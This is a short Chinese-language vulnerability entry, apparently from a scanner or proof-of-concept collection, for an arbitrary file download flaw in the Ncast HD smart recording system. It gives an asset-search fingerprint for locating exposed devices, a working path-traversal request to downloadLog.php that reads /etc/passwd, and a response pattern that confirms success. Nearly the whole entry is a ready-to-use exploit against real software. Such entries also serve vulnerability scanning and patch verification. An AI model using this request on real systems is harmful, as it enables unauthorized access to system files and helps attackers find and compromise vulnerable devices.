# Ncast高清智能录播系统任意文件下载漏洞

Ncast ｜ 其他 ｜ —
- **指纹**：`app="Ncast-产品"`
- **请求**：`GET /developLog/downloadLog.php?name=../../../../etc/passwd HTTP/1.1`
- **响应特征**：200 ^(?=.*?root)(?=.*?bin).*?$